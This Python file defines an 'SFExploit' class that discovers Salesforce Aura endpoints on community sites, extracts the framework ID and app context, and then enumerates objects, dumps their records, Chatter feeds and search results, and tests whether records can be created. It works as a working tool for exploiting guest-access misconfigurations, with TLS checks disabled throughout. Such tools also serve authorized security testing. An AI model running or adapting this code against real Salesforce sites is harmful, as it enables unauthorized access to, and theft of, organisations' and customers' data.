import requests
import re, json
from log import log_message
import urllib.parse
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

SF_URIS_AURA = ['/s/sfsites/aura','/aura','/s/aura']
SF_URI_DOWNLOAD_DOCUMENT="/sfc/servlet.shepherd/document/download/"

SF_APP_DATA=["siteforce:loginApp2", "one:one"]

SF_MESSAGE_CONFIGDATA = json.dumps({"actions":[{"id":"1;a","descriptor":"aura://HostConfigController/ACTION$getConfigData","callingDescriptor":"UHNKNOWN","params":{}}]})
SF_MESSAGE_GETRECORDS = json.dumps({"actions":[{"id":"242;a","descriptor":"serviceComponent://ui.force.components.controllers.relatedList.RelatedListContainerDataProviderController/ACTION$getRecords","callingDescriptor":"UNKNOWN","params":{"recordId":"Topic"}}]})
SF_MESSAGE_GETCURRENTAPP = json.dumps({"actions":[{"descriptor":"serviceComponent://ui.global.components.one.one.controller.OneController/ACTION$getCurrentApp","callingDescriptor":"UNKNOWN","params":{}}]})

SF_RECORDS_PAGE_SIZE=100

class SFExploit:
	def __init__(self, url, uri='', token='', sid='', fwuid='', app_data=''):

		# Init parameters
		self.url = url
		self.token = token
		self.sid = sid
		self.headers = {'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0', 'Accept':'application/json'}
		
		if(sid is not None):
			self.cookies = {'sid':sid}
		else:
			self.cookies = None
		
		# Arbitrary FWUID
		self.fwuid = "wrongfwuid"
		if(fwuid is not None):
			self.fwuid = fwuid
		
		# Arbitrary app data
		if(app_data is not None):
			self.app_data = app_data
		else:
			self.app_data = SF_APP_DATA[0]

		# check if aura exists. If not, there is no point testing forward
		if (uri is not None and len(uri) > 0):
			aura_endpoints = [uri]
		else:
			aura_endpoints = SF_URIS_AURA
		
		# Validate AURA endpoint and context
		not_found = True
		for endpoint in aura_endpoints:
			not_found = self.validate_aura_endpoint(endpoint)
			if (not_found == False):
				break

		if not_found:
			log_message(f">> AURA URI not found or authentication needed.")
			self.invalid = True
		else:
			log_message(f">> Use AURA URI: {self.aura_endpoint}")
			self.invalid = False

			# Get current FWUID
			if (self.fwuid == "wrongfwuid"):
				request_send = requests.get(f"{self.url}/s/login/",verify=False,allow_redirects=True)
				response_headers = request_send.headers.get('Link',None)
				if response_headers:
					self.find_fwuid_and_app_in_response_headers(response_headers)
				else:
					post_body = {'message': SF_MESSAGE_GETRECORDS, 'aura.context':self.context, 'aura.token':self.token}
					request_send = requests.post(f"{self.url}{self.aura_endpoint}", headers = self.headers, cookies=self.cookies, data=post_body, verify=False)
					self.find_fwuid_in_response_body(request_send.text)
				
				# Update the context - FWUID
				log_message(f">> Use FWUID: {self.fwuid}")
				self.context = json.dumps({"mode":"PROD","fwuid":self.fwuid,"app":self.app_data,"loaded":{f"APPLICATION@markup://{self.app_data}":self.app_data},"dn":[],"globals":{},"uad":False})
			
			# Validate / get app
			invalid_app = self.validate_app_data()
			if (invalid_app):
				for app_data in SF_APP_DATA:
					if (self.app_data != app_data):
						self.app_data = app_data
						self.context = json.dumps({"mode":"PROD","fwuid":self.fwuid,"app":self.app_data,"loaded":{f"APPLICATION@markup://{self.app_data}":self.app_data},"dn":[],"globals":{},"uad":False})
						invalid_app = self.validate_app_data()
						if (invalid_app != False):
							break
			
			# Update the context - app data
			if (invalid_app == False):
				log_message(f">> Use app data: {self.app_data}")
			else:
				log_message(f">> App not found: try with --app to specify app name.")
	
	def validate_aura_endpoint(self, endpoint):
		not_found = True

		try:
			context = json.dumps({"mode":"PROD","fwuid":self.fwuid,"app":self.app_data,"loaded":{f"APPLICATION@markup://{self.app_data}":self.app_data},"dn":[],"globals":{},"uad":False})
			post_body = {'message': SF_MESSAGE_GETRECORDS, 'aura.context':context, 'aura.token':self.token}
			post_request = requests.post(f"{self.url}{endpoint}", data=post_body, headers = self.headers, cookies=self.cookies, verify=False)
			response = post_request.text
			if (('aura:clientOutOfSync' in response and post_request.status_code == 200) or ('aura:invalidSession' in response and post_request.status_code == 401)):
				self.aura_endpoint = endpoint
				self.context = context
				not_found = False
		except:
			not_found = True
		return not_found
	
	def find_fwuid_and_app_in_response_headers(self, headers):
		response_headers = urllib.parse.unquote(headers)
		fwuid_pattern = "javascript\/(.*?)\/aura_prod"
		app_pattern = "\"app\":\"(.*?)\""
		self.fwuid = re.search(fwuid_pattern, response_headers).group(1)
		self.app_data = re.search(app_pattern, response_headers).group(1)


	def find_fwuid_in_response_body(self, response_data):
		fwuid_pattern = "Expected:(.*?) Actual"
		search_results = re.search(fwuid_pattern, response_data)
		if (search_results is not None):
			self.fwuid = search_results.group(1).strip()

	def validate_app_data(self):
		message = json.dumps({"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":"whatever","layoutType":"FULL","pageSize":SF_RECORDS_PAGE_SIZE,"currentPage":0,"useTimeout":False,"getCount":True,"enableRowActions":False}}]})
		post_body = {'message':message,'aura.context':self.context,'aura.token':self.token}
		try:
			send_request = requests.post(f"{self.url}{self.aura_endpoint}", headers = self.headers, data=post_body, cookies=self.cookies, verify=False)
			invalid_pattern = ".*invalid_csrf.*|.*internal server error.*"
			invalid_app = re.match(invalid_pattern, send_request.text)
			if (invalid_app is None):
				return False
			else:
				return True
		except:
			return False

	def get_fwuid(self):
		return self.fwuid
	
	def get_app(self):
		return self.app_data
	
	def get_custom_objects(self):
		post_body = {'message': SF_MESSAGE_CONFIGDATA,'aura.context':self.context,'aura.token':self.token}
		try:
			send_request = requests.post(url=f"{self.url}{self.aura_endpoint}", headers = self.headers, data=post_body, cookies=self.cookies, verify=False)
		except:
			objects = list()
		if (send_request.status_code == 200):
			objects = list(send_request.json()['actions'][0]['returnValue']['apiNamesToKeyPrefixes'].keys())
		elif (send_request.status_code == 401):
			log_message(">> Authentication needed (401).")
			objects = list()
		else:
			log_message(f">> Invalid response code on {SF_MESSAGE_CONFIGDATA}")
			objects = list()
		return objects
	
	def get_extended_objects(self):
		post_body = {'message': SF_MESSAGE_GETCURRENTAPP,'aura.context':self.context,'aura.token':self.token}
		try:
			send_request = requests.post(url=f"{self.url}{self.aura_endpoint}", headers = self.headers, data=post_body, cookies=self.cookies, verify=False)
		except:
			objects = list()
		if (send_request.status_code == 200):
			objects = list(send_request.json()['actions'][0]['returnValue']['rootLayoutConfig']['attributes']['values']['appMetadata']['supportedEntities'])
		elif (send_request.status_code == 401):
			log_message(">> Authentication needed (401).")
			objects = list()
		else:
			log_message(f">> Invalid response code on {SF_MESSAGE_CONFIGDATA}")
			objects = list()
		return objects
	
	def get_object_items(self, object_name):
		message = json.dumps({"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.force.components.controllers.lists.selectableListDataProvider.SelectableListDataProviderController/ACTION$getItems","callingDescriptor":"UNKNOWN","params":{"entityNameOrId":object_name,"layoutType":"FULL","pageSize":SF_RECORDS_PAGE_SIZE,"currentPage":0,"useTimeout":False,"getCount":True,"enableRowActions":False}}]})
		post_body = {'message':message,'aura.context':self.context,'aura.token':self.token}
		try:
			send_request = requests.post(f"{self.url}{self.aura_endpoint}", headers = self.headers, data=post_body, cookies=self.cookies, verify=False)
		except:
			return None
		
		if (send_request.status_code == 200):
			response_json = send_request.json()
			if response_json['actions'][0]['state'] == 'SUCCESS':
				try:
					if 'totalCount' in response_json['actions'][0]['returnValue']:
						if response_json['actions'][0]['returnValue']['totalCount'] > 1:
							# more than 1 data exist in records which is problematic.
							return response_json['actions'][0]['returnValue']
						else:
							return None
					else:
						return None
				except:
					return None
			else:
				return None
		else:
			log_message(">> Cannot get objects: authentication needed (401).")
			exit(0)

		
	def get_collab_feeds(self, record_id):
		message = json.dumps({"actions":[{"descriptor":"serviceComponent://ui.chatter.components.aura.components.forceChatter.chatter.FeedController/ACTION$getModel","callingDescriptor":"UNKNOWN","params":{"type":"record","subjectId":record_id,"showFeedItemActions":False,"feedDesign":"DEFAULT","hasFeedSwitcher":False,"modelKey":"templates","showFilteringMenuGroup":False,"includeRecordActivitiesInFeed":False,"retrieveOnlyTopLevelThreadedComments":True}}]})
		post_body = {'message':message,'aura.context':self.context,'aura.token':self.token}
		send_request = requests.post(f"{self.url}{self.aura_endpoint}",
									headers = self.headers, data=post_body, cookies=self.cookies, verify=False).json()
		if send_request['actions'][0]['state'] == 'SUCCESS':
			if 'config' in send_request['actions'][0]['returnValue']:
				if 'feedElementCollection' in send_request['actions'][0]['returnValue']:
					return send_request['actions'][0]['returnValue']['feedElementCollection']
				else:
					return None
			else:
				return None
		else:
			error_message = f"{send_request['actions'][0]['error']}"
			print(f">>> GOT ERROR for {record_id}: {error_message}")
			return None
		
	def search_object(self, object_name):
		message = json.dumps({"actions":[{"id":"123;a","descriptor":"serviceComponent://ui.search.components.forcesearch.scopedresultsdataprovider.ScopedResultsDataProviderController/ACTION$getLookupItems","callingDescriptor":"UNKNOWN","params":{"scope":object_name,"term":"Ae","pageSize":SF_RECORDS_PAGE_SIZE,"currentPage":1,"enableRowActions":False,"additionalFields":[],"useADS":False}}]})
		post_body = {'message':message,'aura.context':self.context,'aura.token':self.token}
		send_request = requests.post(f"{self.url}{self.aura_endpoint}",
									headers = self.headers, data=post_body, cookies=self.cookies, verify=False).json()
		if send_request['actions'][0]['state'] == 'SUCCESS':
			if 'totalSize' in send_request['actions'][0]['returnValue']:
				if send_request['actions'][0]['returnValue']['totalSize'] > 0:
					return send_request['actions'][0]['result']
				else:
					return None
			else:
				return None
		else:
			print(f"ERROR FOR {object_name} : {send_request['actions'][0]['error']}")
			return None
		
	def attempt_record_create(self, object_name):
		message = json.dumps({"actions":[{"id":"123;a","descriptor":"aura://RecordUiController/ACTION$createRecord","callingDescriptor":"UNKNOWN","params":{"recordInput":{"apiName":object_name,"fields":{}}}}]})
		post_body = {'message':message,'aura.context':self.context,'aura.token':self.token}
		try:
			send_request = requests.post(f"{self.url}{self.aura_endpoint}",
									headers = self.headers, data=post_body, cookies=self.cookies, verify=False).json()
		except: 
			return False
		if send_request['actions'][0]['state'] == 'SUCCESS':
			return True
		else:
			# what kind of error (403 or 400)
			try:
				error_code = send_request['actions'][0]['error'][0]['event']['attributes']['values']['error']['data']['statusCode']
				error_code_message = send_request['actions'][0]['error'][0]['event']['attributes']['values']['error']['data'].get('errorCode',None)
				if error_code == 400:
					if 'enhancedErrorType' in send_request['actions'][0]['error'][0]['event']['attributes']['values']['error']['data']:
						if send_request['actions'][0]['error'][0]['event']['attributes']['values']['error']['data']['enhancedErrorType'] == 'RecordError':
							if 'fieldErrors' in send_request['actions'][0]['error'][0]['event']['attributes']['values']['error']['data']['output']:
								required_fields = ",".join(list(send_request['actions'][0]['error'][0]['event']['attributes']['values']['error']['data']['output']['fieldErrors'].keys()))
								return True
					if error_code_message == 'INVALID_TYPE':
						return False
				else:
					return False
			except:
				return False